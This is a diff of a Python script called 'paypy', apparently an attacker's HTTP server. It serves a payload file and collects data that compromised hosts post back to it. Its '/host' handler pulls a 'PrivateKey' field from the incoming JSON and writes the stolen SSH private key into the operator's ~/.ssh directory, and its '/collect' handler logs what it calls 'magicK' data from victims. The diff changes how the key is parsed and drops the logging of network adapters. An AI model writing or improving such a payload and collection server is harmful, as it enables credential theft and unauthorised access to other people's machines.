@@ -21,9 +21,8 @@ class DownloadHandler(SimpleHTTPRequestHandler):
 			stdout.flush()
 
 	def sanitize_key(self, key):
-		if isinstance(key, str):
-			key = key.replace('\r\n', '\n').strip()
-			key = ''.join([char for char in key if ord(char) < 128])
+		key = key.replace('\r\n', '\n').strip()
+		key = ''.join([char for char in key if ord(char) < 128])
 		return key
 
 	def do_POST(self):
@@ -31,16 +30,11 @@ class DownloadHandler(SimpleHTTPRequestHandler):
 		post_data = self.rfile.read(content_length)
 		current_time = strftime('%Y-%m-%d %H:%M:%S')
 		client_ip = self.client_address[0]
-		
-		stdout.write(f'{Fore.RED}[raw data]{Style.RESET_ALL} {post_data.decode()}\n')
-		stdout.flush()
-		
 		if self.path == '/host':
-			stdout.write(f'{Fore.RED}[host]{Style.RESET_ALL} {current_time} - {client_ip} - Host notification received:\n')
+			stdout.write(f'{Fore.RED}[host]{Style.RESET_ALL} {current_time} - {client_ip} - Host notification received:\n{post_data.decode()}\n')
 			try:
 				post_json = json.loads(post_data.decode())
-				
-				private_key = post_json.get("PrivateKey", "")
+				private_key = post_json.get("PrivateKey", {}).get("value", "")
 				if private_key:
 					private_key = self.sanitize_key(private_key)
 					os.makedirs(os.path.expanduser("~/.ssh"), exist_ok=True)
@@ -51,24 +45,9 @@ class DownloadHandler(SimpleHTTPRequestHandler):
 					stdout.write(f'{Fore.GREEN}[success]{Style.RESET_ALL} Private key saved to {private_key_path}\n')
 				else:
 					stdout.write(f'{Fore.YELLOW}[warning]{Style.RESET_ALL} No private key found in POST data\n')
-				
-				adapters = post_json.get("Adapters", [])
-				if isinstance(adapters, list):
-					for adapter in adapters:
-						interface = adapter.get("Interface", "")
-						ip_address = adapter.get("IPAddress", "")
-						if isinstance(interface, str) and isinstance(ip_address, str):
-							stdout.write(f'{Fore.BLUE}[adapter]{Style.RESET_ALL} Interface: {interface}, IP: {ip_address}\n')
-						else:
-							stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Invalid adapter data\n')
-				else:
-					stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Adapters data is not a list\n')
-					
 			except json.JSONDecodeError:
 				stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Failed to decode JSON from POST data\n')
-			except Exception as e:
-				stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} {str(e)}\n')
-	
+
 		elif self.path == '/collect':
 			stdout.write(f'{Fore.GREEN}[magicK]{Style.RESET_ALL} {current_time} - {client_ip} - Received magicK data:\n{post_data.decode()}\n')
 		else:
@@ -84,10 +63,12 @@ def get_local_ip():
 	s.close()
 	return local_ip
 
+# warn
 if len(argv) != 3:
 	print('usage: paypy <port> </payload/path>')
 	exit(1)
 
+# run server
 port = int(argv[1])
 file_path = argv[2]
 DownloadHandler.base_path = file_path
